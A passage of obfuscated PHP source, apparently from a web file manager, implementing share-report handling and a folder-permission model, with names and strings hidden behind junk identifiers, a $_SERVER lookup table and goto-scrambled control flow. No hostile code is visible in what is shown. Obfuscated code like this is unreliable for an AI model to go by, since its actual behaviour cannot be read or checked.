$e„¥º½±½‡ = array(); if ($D™„ê‰™‹„[$fä°É¹©é¦[1561]]) { $e„¥º½±½‡[$fä°É¹©é¦[1561]] = $D™„ê‰™‹„[$fä°É¹©é¦[1561]]; } goto cæùâ¿óÕ; eåÜ­Ê¾„Ÿ: $Dğöœ„Ü‰á = $this->_makeOrder()->where($e„¥º½±½‡)->selectPage(20); if (empty($Dğöœ„Ü‰á[$fä°É¹©é¦[367]])) { return array(); } $this->_listDataApply($Dğöœ„Ü‰á[$fä°É¹©é¦[367]]); goto føùõš–ŞÕ; føùõš–ŞÕ: return $Dğöœ„Ü‰á; goto e¿„éÄÒ©ã; cæùâ¿óÕ: if ($D™„ê‰™‹„[$fä°É¹©é¦[754]]) { $f™ÚøËß¼ = $D™„ê‰™‹„[$fä°É¹©é¦[491]] ? $D™„ê‰™‹„[$fä°É¹©é¦[491]] : strtotime(date($fä°É¹©é¦[1891])); $e„¥º½±½‡[$fä°É¹©é¦[194]] = array($fä°É¹©é¦[331], array($D™„ê‰™‹„[$fä°É¹©é¦[754]], $f™ÚøËß¼)); } if ($D™„ê‰™‹„[$fä°É¹©é¦[29]]) { $e„¥º½±½‡[$D™„ê‰™‹„[$fä°É¹©é¦[29]]] = 1; } else { $e„¥º½±½‡[] = array($fä°É¹©é¦[488] => array($fä°É¹©é¦[1005], 0), $fä°É¹©é¦[490] => array($fä°É¹©é¦[1005], 0), $fä°É¹©é¦[1868] => $fä°É¹©é¦[1822]); } if ($D™„ê‰™‹„[$fä°É¹©é¦[1818]]) { $e„¥º½±½‡[] = array($fä°É¹©é¦[485] => $D™„ê‰™‹„[$fä°É¹©é¦[1818]], $fä°É¹©é¦[1464] => array($fä°É¹©é¦[381], "\x25{$D™„ê‰™‹„[$fä°É¹©é¦[1818]]}\x25"), $fä°É¹©é¦[1868] => $fä°É¹©é¦[1822]); } goto eåÜ­Ê¾„Ÿ; e¿„éÄÒ©ã: } public function listDataApply($B»™ê¶©¸‹) { $this->_listDataApply($B»™ê¶©¸‹); return $B»™ê¶©¸‹; } private function _listDataApply(&$F™‡­¦Ü§) { goto d«Íí‚Àš‰; eÔÅ¤ßñ†: unset($D‰Ìì¼à‘); $F™‡­¦Ü§ = array_values($F™‡­¦Ü§); goto ağ‘¹Š·…Ä; cµùª·ë±Ô: $B¢—âÂâ‘Ö = array_to_keyvalue($F™‡­¦Ü§, $b˜”ÇñÖ£Ê[33], $b˜”ÇñÖ£Ê[397]); $FÒ†İÕƒ§Ù = Model($b˜”ÇñÖ£Ê[825])->sourceListInfo($B¢—âÂâ‘Ö, !0); foreach ($F™‡­¦Ü§ as $cÑÅ«åáà => &$D‰Ìì¼à‘) { $b‹é™ñ„Ïñ = $D‰Ìì¼à‘[$b˜”ÇñÖ£Ê[1561]]; $D‰Ìì¼à‘[$b˜”ÇñÖ£Ê[1892]] = $Bˆ˜·‹Ü¤[$b‹é™ñ„Ïñ] ? $Bˆ˜·‹Ü¤[$b‹é™ñ„Ïñ] : !1; $a‘“Ë¹Ä£ã = $D‰Ìì¼à‘[$b˜”ÇñÖ£Ê[397]]; $D‰Ìì¼à‘[$b˜”ÇñÖ£Ê[85]] = $FÒ†İÕƒ§Ù[$a‘“Ë¹Ä£ã] ? $FÒ†İÕƒ§Ù[$a‘“Ë¹Ä£ã] : !1; if ($D‰Ìì¼à‘[$b˜”ÇñÖ£Ê[85]][$b˜”ÇñÖ£Ê[425]] == $b˜”ÇñÖ£Ê[87]) { unset($F™‡­¦Ü§[$cÑÅ«åáà]); } if ($D‰Ìì¼à‘[$b˜”ÇñÖ£Ê[85]] != $b˜”ÇñÖ£Ê[191] && !$D‰Ìì¼à‘[$b˜”ÇñÖ£Ê[85]]) { unset($F™‡­¦Ü§[$cÑÅ«åáà]); } } goto eÔÅ¤ßñ†; d«Íí‚Àš‰: $b˜”ÇñÖ£Ê =& $_SERVER[Ö‘Øù]; $F–ŞÙòåÀõ = array_to_keyvalue($F™‡­¦Ü§, $b˜”ÇñÖ£Ê[33], $b˜”ÇñÖ£Ê[1561]); $Bˆ˜·‹Ü¤ = Model($b˜”ÇñÖ£Ê[533])->userListInfo(array_unique($F–ŞÙòåÀõ)); goto cµùª·ë±Ô; ağ‘¹Š·…Ä: } private function _makeOrder($C‰ŠŠá¡ôâ = '') { goto BºÖ†ÇÚº•; c¡‰í‘ÚÒÇ: $C‰ŠŠá¡ôâ = $C‰ŠŠá¡ôâ . "{$E¥±åÖœç}\x20{$F´•ÚöÁ†ˆ}"; return $this->order($C‰ŠŠá¡ôâ); goto EÁÏÁ¬ô“; cÔŒ¦ÖÍ‹Û: $E¥±åÖœç = Input::get($F¯³×èË–[450], $F¯³×èË–[7], $F¯³×èË–[418], $añÁ­Ü¯); $F´•ÚöÁ†ˆ = Input::get($F¯³×èË–[451], $F¯³×èË–[7], $F¯³×èË–[1893], array($F¯³×èË–[1817], $F¯³×èË–[445])); $F´•ÚöÁ†ˆ = $B¯š‘¦Ê¶Ç[$F´•ÚöÁ†ˆ]; goto c¡‰í‘ÚÒÇ; BºÖ†ÇÚº•: $F¯³×èË– =& $_SERVER[Ö‘Øù]; $añÁ­Ü¯ = array($F¯³×èË–[194], $F¯³×èË–[491], $F¯³×èË–[1881], $F¯³×èË–[1882]); $B¯š‘¦Ê¶Ç = array($F¯³×èË–[443] => $F¯³×èË–[444], $F¯³×èË–[445] => $F¯³×èË–[446]); goto cÔŒ¦ÖÍ‹Û; EÁÏÁ¬ô“: } public function reportAdd($dêä³„Ö×) { $d¶ÁßÇ¬îÃ =& $_SERVER[Ö‘Øù]; $dÇõ¹²ãŞ = array($d¶ÁßÇ¬îÃ[483] => $dêä³„Ö×[$d¶ÁßÇ¬îÃ[483]], $d¶ÁßÇ¬îÃ[1561] => USER_ID); if (Model($d¶ÁßÇ¬îÃ[1889])->where($dÇõ¹²ãŞ)->find()) { return !1; } $E’ãÂˆàŒò = array($d¶ÁßÇ¬îÃ[483] => $dêä³„Ö×[$d¶ÁßÇ¬îÃ[483]], $d¶ÁßÇ¬îÃ[1464] => $dêä³„Ö×[$d¶ÁßÇ¬îÃ[1464]], $d¶ÁßÇ¬îÃ[397] => $dêä³„Ö×[$d¶ÁßÇ¬îÃ[397]], $d¶ÁßÇ¬îÃ[462] => $dêä³„Ö×[$d¶ÁßÇ¬îÃ[462]], $d¶ÁßÇ¬îÃ[1561] => USER_ID, $d¶ÁßÇ¬îÃ[29] => $dêä³„Ö×[$d¶ÁßÇ¬îÃ[29]], $d¶ÁßÇ¬îÃ[446] => $dêä³„Ö×[$d¶ÁßÇ¬îÃ[446]]); return Model($d¶ÁßÇ¬îÃ[1889])->add($E’ãÂˆàŒò); } public function reportList($D’­¿ñ†¯ˆ) { goto cÂ×’ç¢äÍ; CåÚ²—å·Ø: $e„·»®¡¡µ = array($E¦šìãÔ»ë[443] => $E¦šìãÔ»ë[444], $E¦šìãÔ»ë[445] => $E¦šìãÔ»ë[446]); $Fä´¿ğ¹ßó = $E¦šìãÔ»ë[1897] . $e„·»®¡¡µ[$açöÌ©íö]; $d–Î²×ÖÙ = Model($E¦šìãÔ»ë[1889])->where($eŞêóŞÍã»)->order($Fä´¿ğ¹ßó)->selectPage(20); goto c‹ÖŞĞã‡Œ; c‹ÖŞĞã‡Œ: if (empty($d–Î²×ÖÙ[$E¦šìãÔ»ë[367]])) { return array(); } $d¯ÌŠ¹«äÓ = array_to_keyvalue_group($d–Î²×ÖÙ[$E¦šìãÔ»ë[367]], $E¦šìãÔ»ë[743], $E¦šìãÔ»ë[483]); if (!empty($d¯ÌŠ¹«äÓ[0])) { $D’­¿ñ†¯ˆ = $d¯ÌŠ¹«äÓ[0]; $eŞêóŞÍã» = array($E¦šìãÔ»ë[483] => array($E¦šìãÔ»ë[7], $D’­¿ñ†¯ˆ)); $b•¤¨¼  = $this->where($eŞêóŞÍã»)->field($E¦šìãÔ»ë[483])->select(); $b•¤¨¼  = array_to_keyvalue($b•¤¨¼ , $E¦šìãÔ»ë[33], $E¦šìãÔ»ë[483]); $B¤¡å’˜İ¥ = array_diff($D’­¿ñ†¯ˆ, $b•¤¨¼ ); if (!empty($B¤¡å’˜İ¥)) { foreach ($d–Î²×ÖÙ[$E¦šìãÔ»ë[367]] as $dØ´é‰‰Ï => $fˆ—ãª‡·) { if (in_array($fˆ—ãª‡·[$E¦šìãÔ»ë[483]], $B¤¡å’˜İ¥)) { unset($d–Î²×ÖÙ[$E¦šìãÔ»ë[367]][$dØ´é‰‰Ï]); } } } } goto aÀà‚Õ”Ì‡; cÂ×’ç¢äÍ: $E¦šìãÔ»ë =& $_SERVER[Ö‘Øù]; $eŞêóŞÍã» = array(); if ($D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[754]]) { $fÊîï£Ô¶Š = $D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[491]] ? $D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[491]] : strtotime(date($E¦šìãÔ»ë[1891])); $eŞêóŞÍã»[$E¦šìãÔ»ë[194]] = array($E¦šìãÔ»ë[331], array($D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[754]], $fÊîï£Ô¶Š)); } goto eöõò‹¡Óé; eöõò‹¡Óé: if (isset($D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[29]]) && in_array($D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[29]], array($E¦šìãÔ»ë[87], $E¦šìãÔ»ë[430], $E¦šìãÔ»ë[1894], $E¦šìãÔ»ë[1895], $E¦šìãÔ»ë[1896]))) { $eŞêóŞÍã»[$E¦šìãÔ»ë[29]] = $D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[29]]; } if (isset($D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[743]]) && in_array($D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[743]], array($E¦šìãÔ»ë[191], $E¦šìãÔ»ë[87], $E¦šìãÔ»ë[430], $E¦šìãÔ»ë[1894]))) { $eŞêóŞÍã»[$E¦šìãÔ»ë[743]] = $D’­¿ñ†¯ˆ[$E¦šìãÔ»ë[743]]; } $açöÌ©íö = Input::get($E¦šìãÔ»ë[451], $E¦šìãÔ»ë[7], $E¦šìãÔ»ë[1893], array($E¦šìãÔ»ë[1817], $E¦šìãÔ»ë[445])); goto CåÚ²—å·Ø; aÀà‚Õ”Ì‡: $this->_listDataApply($d–Î²×ÖÙ[$E¦šìãÔ»ë[367]]); return $d–Î²×ÖÙ; goto B¾½œÚÃÅÆ; B¾½œÚÃÅÆ: } public function reportStatus($BÃÈ¤àÆ¼) { goto B›‘´½á ; e½Ø‘İé½Ã: return $dœ¬’è¨Åİ; goto a’í§Ë´À±; B›‘´½á : $B¥¦Ú§Á‡” =& $_SERVER[Ö‘Øù]; $C–‘·õÓ˜Ä = array($B¥¦Ú§Á‡”[395] => $BÃÈ¤àÆ¼[$B¥¦Ú§Á‡”[395]]); $fï‹»™Å‹ = Model($B¥¦Ú§Á‡”[1889])->where($C–‘·õÓ˜Ä)->field($B¥¦Ú§Á‡”[1898])->find(); goto d±Ø‘”ƒÁ; d±Ø‘”ƒÁ: if (!$fï‹»™Å‹) { return !1; } $B°…¾ê·à = array($B¥¦Ú§Á‡”[743] => $BÃÈ¤àÆ¼[$B¥¦Ú§Á‡”[743]]); if ($BÃÈ¤àÆ¼[$B¥¦Ú§Á‡”[743]] == $B¥¦Ú§Á‡”[1894] && $fï‹»™Å‹[$B¥¦Ú§Á‡”[743]] == $B¥¦Ú§Á‡”[1894]) { $B°…¾ê·à[$B¥¦Ú§Á‡”[743]] = 0; } goto DÓÆíİ ç; DÓÆíİ ç: $dœ¬’è¨Åİ = Model($B¥¦Ú§Á‡”[1889])->where($C–‘·õÓ˜Ä)->save($B°…¾ê·à); if ($BÃÈ¤àÆ¼[$B¥¦Ú§Á‡”[743]] == $B¥¦Ú§Á‡”[430]) { if ($fï‹»™Å‹[$B¥¦Ú§Á‡”[462]] != $B¥¦Ú§Á‡”[191] && $this->shareFileMeta($fï‹»™Å‹[$B¥¦Ú§Á‡”[462]])) { $this->shareFileMeta($fï‹»™Å‹[$B¥¦Ú§Á‡”[462]], 0); } $this->remove($fï‹»™Å‹[$B¥¦Ú§Á‡”[483]]); return !0; } if ($dœ¬’è¨Åİ && $BÃÈ¤àÆ¼[$B¥¦Ú§Á‡”[743]] == $B¥¦Ú§Á‡”[1894]) { $aÀ’ºˆµÈó = $B°…¾ê·à[$B¥¦Ú§Á‡”[743]] == $B¥¦Ú§Á‡”[1894] ? 1 : 0; $this->shareFileMeta($fï‹»™Å‹[$B¥¦Ú§Á‡”[462]], $aÀ’ºˆµÈó); $this->removeByFile($fï‹»™Å‹[$B¥¦Ú§Á‡”[462]]); } goto e½Ø‘İé½Ã; a’í§Ë´À±: } private function removeByFile($EÁ«×ÖÒ) { goto FøÉ‘ïºŒå; dÍØ…Öƒ²: $f™‰é„…Ôã = array($a¯„×ŠÌ¤Å[397] => array($a¯„×ŠÌ¤Å[7], $FÅ÷ŠøÙµ‘), $a¯„×ŠÌ¤Å[488] => 1); $cİ¿£ÛöĞ = $this->where($f™‰é„…Ôã)->field($a¯„×ŠÌ¤Å[483])->select(); if (empty($cİ¿£ÛöĞ)) { return; } goto EÕï«ƒèö; EÕï«ƒèö: $A²»Ñ§ì–í = array_to_keyvalue($cİ¿£ÛöĞ, $a¯„×ŠÌ¤Å[33], $a¯„×ŠÌ¤Å[483]); $this->remove($A²»Ñ§ì–í); goto D’âìå’Š; FøÉ‘ïºŒå: $a¯„×ŠÌ¤Å =& $_SERVER[Ö‘Øù]; $cİ¿£ÛöĞ = Model($a¯„×ŠÌ¤Å[825])->where(array($a¯„×ŠÌ¤Å[462] => $EÁ«×ÖÒ))->field($a¯„×ŠÌ¤Å[397])->select(); $FÅ÷ŠøÙµ‘ = array_to_keyvalue($cİ¿£ÛöĞ, $a¯„×ŠÌ¤Å[33], $a¯„×ŠÌ¤Å[397]); goto dÍØ…Öƒ²; D’âìå’Š: } private function shareFileMeta($B•Ã¦¢³¶, $FáË‰ ÈŸ• = null) { $b†ºôÜˆßÊ =& $_SERVER[Ö‘Øù]; $b±«çâ = array($b†ºôÜˆßÊ[462] => $B•Ã¦¢³¶, $b†ºôÜˆßÊ[93] => $b†ºôÜˆßÊ[1899]); if (is_null($FáË‰ ÈŸ•)) { return Model($b†ºôÜˆßÊ[1900])->where($b±«çâ)->find(); } $b±«çâ[$b†ºôÜˆßÊ[372]] = $FáË‰ ÈŸ•; Model($b†ºôÜˆßÊ[1900])->add($b±«çâ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\143\x65\x5f\141\165\x74\x68"; public function getAuth($dİô†ğÅÈÉ) { goto cğÀÕÖƒäœ; a ½Š…Ò§¨: array_multisort($aéÃ¤ù‘ºß, SORT_DESC, $cÂà‹…²åì); return $cÂà‹…²åì; goto EÊÌ“øŒÉè; cğÀÕÖƒäœ: $FŞ¯Òù÷¿ =& $_SERVER[Ö‘Øù]; $c¹”¼…¨ä˜ = $this->sourceAuthSelect($dİô†ğÅÈÉ); $cÂà‹…²åì = array(); goto FŸì¶ùÆ‹; FŸì¶ùÆ‹: $aéÃ¤ù‘ºß = array(); $cºß¯ÀÔæÊ = 2 << 25; foreach ($c¹”¼…¨ä˜ as $c¶Ş¼”»¾) { goto E…çß“¾Üí; Cäƒ¡‘„ÕÚ: $Dˆä—Øœ¾¯ = 0; if ($c¶Ş¼”»¾[$FŞ¯Òù÷¿[406]] == SourceModel::TYPE_GROUP) { $Dˆä—Øœ¾¯ = $cºß¯ÀÔæÊ * 2; } if ($c¶Ş¼”»¾[$FŞ¯Òù÷¿[406]] == SourceModel::TYPE_USER) { $Dˆä—Øœ¾¯ = $cºß¯ÀÔæÊ; } goto DêÛƒÒ‹¶; DêÛƒÒ‹¶: if ($c¶Ş¼”»¾[$FŞ¯Òù÷¿[406]] == SourceModel::TYPE_USER && $c¶Ş¼”»¾[$FŞ¯Òù÷¿[499]] == $FŞ¯Òù÷¿[191]) { $Dˆä—Øœ¾¯ = 0; } $aéÃ¤ù‘ºß[] = $d‰÷ÏšÜĞ÷[$FŞ¯Òù÷¿[408]] + $Dˆä—Øœ¾¯; goto e¨ªÂÎ†æ; E…çß“¾Üí: $d‰÷ÏšÜĞ÷ = Model($FŞ¯Òù÷¿[502])->listData($c¶Ş¼”»¾[$FŞ¯Òù÷¿[1830]]); if (!$d‰÷ÏšÜĞ÷) { continue; } $cÂà‹…²åì[] = $c¶Ş¼”»¾; goto Cäƒ¡‘„ÕÚ; e¨ªÂÎ†æ: } goto a ½Š…Ò§¨; EÊÌ“øŒÉè: } public function sourceAuthSelect($aˆŒ­í¾Êì) { goto A¾ò£òÕ½; A¾ò£òÕ½: $A©Îªòï ¥ =& $_SERVER[Ö‘Øù]; static $Fé´È¶ñùÃ = array(); $eÖÆ¼âÚÍ• = is_array($aˆŒ­í¾Êì) ? !1 : !0; goto dŠ±ğÕ¢££; eéòÖº“»‡: if (count($C©å¯Ù„ˆ) == count($aˆŒ­í¾Êì)) { return $eÖÆ¼âÚÍ• ? $C©å¯Ù„ˆ[$aˆŒ­í¾Êì[0]] : $C©å¯Ù„ˆ; } $fÑ“–¦‰íŒ = $A©Îªòï ¥[1901]; $EõŒï•Ş…â = array($A©Îªòï ¥[397] => array($A©Îªòï ¥[7], $aˆŒ­í¾Êì)); goto C‰ˆÛ¯¼½¤; C‰ˆÛ¯¼½¤: $DÃŠ¢çùí® = $this->field($fÑ“–¦‰íŒ)->order($A©Îªòï ¥[395])->where($EõŒï•Ş…â)->select(); $A³¡¨âø‚ò = array_to_keyvalue_group($DÃŠ¢çùí®, $A©Îªòï ¥[397]); foreach ($aˆŒ­í¾Êì as $e¨‚›Õ†ôĞ) { $Fé´È¶ñùÃ[$e¨‚›Õ†ôĞ] = $A³¡¨âø‚ò[$e¨‚›Õ†ôĞ] ? $A³¡¨âø‚ò[$e¨‚›Õ†ôĞ] : array(); } goto dÀœÙ÷½ÜÖ; dÀœÙ÷½ÜÖ: if ($eÖÆ¼âÚÍ•) { return $DÃŠ¢çùí®; } return $A³¡¨âø‚ò; goto cØ†éõ£˜¼; dŠ±ğÕ¢££: if ($eÖÆ¼âÚÍ•) { $aˆŒ­í¾Êì = array($aˆŒ­í¾Êì); } $C©å¯Ù„ˆ = array(); foreach ($aˆŒ­í¾Êì as $e¨‚›Õ†ôĞ) { if (isset($Fé´È¶ñùÃ[$e¨‚›Õ†ôĞ])) { $C©å¯Ù„ˆ[$e¨‚›Õ†ôĞ] = $Fé´È¶ñùÃ[$e¨‚›Õ†ôĞ]; } } goto eéòÖº“»‡; cØ†éõ£˜¼: } public function setAuth($dƒÆÓªƒ, $c‘»šÕÀ¨») { goto cÒ÷ÒÇË²è; eğ×î¦Á¦: if ($DÆ«é¾ != $f¦ğÔÌÄ‹) { $b…ÄÒÙ¡‡Õ = array($A¨ô›ñ»Àñ[1730] => $DÆ«é¾); $DºÔä…åˆê = Model($A¨ô›ñ»Àñ[1816])->field($A¨ô›ñ»Àñ[1561])->where($b…ÄÒÙ¡‡Õ)->select(); $DºÔä…åˆê = array_to_keyvalue($DºÔä…åˆê, $A¨ô›ñ»Àñ[33], $A¨ô›ñ»Àñ[1561]); } $DˆØÇ»šÕ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $aÆ¯¥ç³åâ = array(); goto EŠèÆä–; F·©ìŠä¤: return !0; goto D”ÍÂØÕ; D»™Ê¤ô•: if ($CÛ–—×[$A¨ô›ñ»Àñ[406]] != SourceModel::TYPE_GROUP) { return !1; } $f¦ğÔÌÄ‹ = 1; $DÆ«é¾ = $CÛ–—×[$A¨ô›ñ»Àñ[499]]; goto eğ×î¦Á¦; cÒ÷ÒÇË²è: $A¨ô›ñ»Àñ =& $_SERVER[Ö‘Øù]; $CÛ–—× = Model($A¨ô›ñ»Àñ[1240])->sourceInfo($dƒÆÓªƒ); if (!$CÛ–—×) { return !1; } goto D»™Ê¤ô•; EŠèÆä–: foreach ($c‘»šÕÀ¨» as $AÌÛ„ìÉ¶Ì) { if (!in_array($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[406]], $DˆØÇ»šÕ)) { show_json(LNG($A¨ô›ñ»Àñ[1902]), !1); } if ($DÆ«é¾ != $f¦ğÔÌÄ‹) { if ($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[406]] == SourceModel::TYPE_GROUP) { } if ($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[499]] != 0 && !in_array($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[499]], $DºÔä…åˆê)) { } } if ($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[499]] == 0) { $AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[406]] = SourceModel::TYPE_USER; } $aÆ¯¥ç³åâ[] = array($A¨ô›ñ»Àñ[397] => $dƒÆÓªƒ, $A¨ô›ñ»Àñ[406] => intval($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[406]]), $A¨ô›ñ»Àñ[499] => intval($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[499]]), $A¨ô›ñ»Àñ[1830] => intval($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[1830]]) ? intval($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[1830]]) : 0, $A¨ô›ñ»Àñ[1884] => intval($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[1884]]) ? intval($AÌÛ„ìÉ¶Ì[$A¨ô›ñ»Àñ[1884]]) : -1); } $this->where(array($A¨ô›ñ»Àñ[412] => $dƒÆÓªƒ))->delete(); $this->addAll($aÆ¯¥ç³åâ); goto F·©ìŠä¤; D”ÍÂØÕ: } public function authClear($aøªÁï‡ÚÚ) { $A¡åÁá‚Á‡ =& $_SERVER[Ö‘Øù]; $f„ ™…Ñ²Ü = Model($A¡åÁá‚Á‡[1240])->sourceInfo($aøªÁï‡ÚÚ); $fä‰µêãó÷ = array($aøªÁï‡ÚÚ); if ($f„ ™…Ñ²Ü[$A¡åÁá‚Á‡[405]] == $A¡åÁá‚Á‡[87]) { $bƒğéóµ¤ = array($A¡åÁá‚Á‡[579] => array($A¡åÁá‚Á‡[539], $f„ ™…Ñ²Ü[$A¡åÁá‚Á‡[516]] . $aøªÁï‡ÚÚ . $A¡åÁá‚Á‡[540])); $fä‰µêãó÷ = Model($A¡åÁá‚Á‡[1240])->field($A¡åÁá‚Á‡[412])->where($bƒğéóµ¤)->getField($A¡åÁá‚Á‡[397], !0); $fä‰µêãó÷[] = $aøªÁï‡ÚÚ; } $this->where(array($A¡åÁá‚Á‡[412] => array($A¡åÁá‚Á‡[413], $fä‰µêãó÷)))->delete(); return !0; } public function getAllChildren($d°Ù´ÚöÙ) { goto fö“–İê•¿; a†³µïîŞò: if ($F®‡¢…ˆ[$Aá‚ˆº×õŒ[493]] == $Aá‚ˆº×õŒ[191] && $F®‡¢…ˆ[$Aá‚ˆº×õŒ[499]] != $eô‰‡ÇÇÔ) { $aİÕË¯¿ÂŒ = $this->groupChidldAllRootSource($F®‡¢…ˆ[$Aá‚ˆº×õŒ[499]]); } $EßŞÁöÅ›ë = $this->field($Aá‚ˆº×õŒ[397])->group($Aá‚ˆº×õŒ[397])->select(); $EßŞÁöÅ›ë = array_to_keyvalue($EßŞÁöÅ›ë, $Aá‚ˆº×õŒ[33], $Aá‚ˆº×õŒ[397]); goto dùˆïÊ©Ö; fö“–İê•¿: $Aá‚ˆº×õŒ =& $_SERVER[Ö‘Øù]; $F®‡¢…ˆ = Model($Aá‚ˆº×õŒ[1240])->sourceInfo($d°Ù´ÚöÙ); if ($F®‡¢…ˆ[$Aá‚ˆº×õŒ[405]] != $Aá‚ˆº×õŒ[87]) { return $this->sourceListAuth(array($d°Ù´ÚöÙ)); } goto DĞ×‡Œô¶; fÁœÃíÇÏ: $B†ôß§á© = Model($Aá‚ˆº×õŒ[825])->field($A±‹Êº±Ù‚)->where($DŒù’ÖÚÜ•)->select(); $dËâ‘½ë¹ = array($d°Ù´ÚöÙ); foreach ($B†ôß§á© as $C£îøÏ¶–Ú) { foreach ($aİÕË¯¿ÂŒ as $E‘­¼Ó„ºŠ) { $Eƒµ®ªÓÇÊ = $Aá‚ˆº×õŒ[47] . $E‘­¼Ó„ºŠ . $Aá‚ˆº×õŒ[47]; $Bò†¹ÕŒ‘ï = $C£îøÏ¶–Ú[$Aá‚ˆº×õŒ[516]] . $C£îøÏ¶–Ú[$Aá‚ˆº×õŒ[397]] . $Aá‚ˆº×õŒ[47]; if (strstr($Bò†¹ÕŒ‘ï, $Eƒµ®ªÓÇÊ)) { $dËâ‘½ë¹[] = $C£îøÏ¶–Ú[$Aá‚ˆº×õŒ[397]]; break; } } } goto c±ÍêĞä¾²; DĞ×‡Œô¶: if ($F®‡¢…ˆ[$Aá‚ˆº×õŒ[406]] != SourceModel::TYPE_GROUP) { return array(); } $eô‰‡ÇÇÔ = 1; $aİÕË¯¿ÂŒ = array($d°Ù´ÚöÙ); goto a†³µïîŞò; dùˆïÊ©Ö: if (!$EßŞÁöÅ›ë) { return array(); } $A±‹Êº±Ù‚ = $Aá‚ˆº×õŒ[1903]; $DŒù’ÖÚÜ• = array($Aá‚ˆº×õŒ[397] => array($Aá‚ˆº×õŒ[7], $EßŞÁöÅ›ë), $Aá‚ˆº×õŒ[425] => $Aá‚ˆº×õŒ[191]); goto fÁœÃíÇÏ; c±ÍêĞä¾²: return $this->sourceListAuth($dËâ‘½ë¹); goto E¥¯é—ùÁ–; E¥¯é—ùÁ–: } private function sourceListAuth($F±¬öÙÀ‰–) { goto DßìßÊÄ¨Û; AŠÀîãÏçã: $b„´¯Èæ½¼ = array(); $C…Ò˜¦å” = array(); foreach ($bª‚ ›²Å¾ as $A‡Ÿ¿óÜ÷¡) { goto cõ´Ç¹Ãì; cõ´Ç¹Ãì: unset($A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[449]]); unset($A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[447]]); unset($A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[408]]); goto b£¹‰…Ê†ñ; b£¹‰…Ê†ñ: unset($A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[85]]); $fìò½Ø…Ş™ = $EãéĞ°º™†[$A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[397]]]; if (!$fìò½Ø…Ş™) { continue; } goto f°­´ÏÛİÌ; f°­´ÏÛİÌ: $A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[1904]] = $this->authTargetInfo($fìò½Ø…Ş™); $A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[514]] = rtrim($A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[520]], $d¯«ùÃ·áÓ[8]) . $d¯«ùÃ·áÓ[8] . ltrim($A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[514]], $d¯«ùÃ·áÓ[8]); $b„´¯Èæ½¼[] = $A‡Ÿ¿óÜ÷¡; goto dø„ÔêÇ©; dø„ÔêÇ©: $fÙƒÁØ“£· = count(explode($d¯«ùÃ·áÓ[8], trim($A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[514]], $d¯«ùÃ·áÓ[8]))); $C…Ò˜¦å”[] = $fÙƒÁØ“£· + ($A‡Ÿ¿óÜ÷¡[$d¯«ùÃ·áÓ[29]] == $d¯«ùÃ·áÓ[77] ? 0 : 1000); goto FæóŠ‚†Ä; FæóŠ‚†Ä: } goto c ŠÛ¯¨; DßìßÊÄ¨Û: $d¯«ùÃ·áÓ =& $_SERVER[Ö‘Øù]; $bª‚ ›²Å¾ = Model($d¯«ùÃ·áÓ[1240])->sourceListInfo($F±¬öÙÀ‰–, !0); $EãéĞ°º™† = $this->sourceAuthSelect($F±¬öÙÀ‰–); goto AŠÀîãÏçã; c ŠÛ¯¨: array_multisort($C…Ò˜¦å”, SORT_ASC, $b„´¯Èæ½¼); return $b„´¯Èæ½¼; goto e«Ì†Œ˜™Š; e«Ì†Œ˜™Š: } private function groupChidldAllRootSource($A¯ŒéøÍÔ’) { $c¤Îó¨Æ =& $_SERVER[Ö‘Øù]; $f‡ìùö¶Ùœ = Model($c¤Îó¨Æ[1905])->groupChildrenAll($A¯ŒéøÍÔ’); $BÓÍšãÕ“Í = array($c¤Îó¨Æ[493] => 0, $c¤Îó¨Æ[499] => array($c¤Îó¨Æ[7], $f‡ìùö¶Ùœ), $c¤Îó¨Æ[406] => SourceModel::TYPE_GROUP); $d‘‚ÕÜçæ‘ = Model($c¤Îó¨Æ[825])->field($c¤Îó¨Æ[397])->where($BÓÍšãÕ“Í)->select(); $d‘‚ÕÜçæ‘ = array_to_keyvalue($d‘‚ÕÜçæ‘, $c¤Îó¨Æ[33], $c¤Îó¨Æ[397]); return $d‘‚ÕÜçæ‘; } private function authTargetInfo($e˜¦Öà¯) { goto AĞœÎä½…Ñ; dõÉÎçáˆ: $e»ù‡‰£Ü¢ = 2 << 25; foreach ($e˜¦Öà¯ as $aŒÂ ÇÌ‰) { goto FµôÄ‡õÄ; a—É˜Ü…¸: if (!$aÒßô‰‘éó) { continue; } $aÒßô‰‘éó[$D¤Ú¤è¡õÆ[461]] = $c´’š§šŠ×; $f‰×ê¨ÑÎÑ[] = $aÒßô‰‘éó; goto dÊÎËêùÃ–; FµôÄ‡õÄ: $c´’š§šŠ× = Model($D¤Ú¤è¡õÆ[502])->listData($aŒÂ 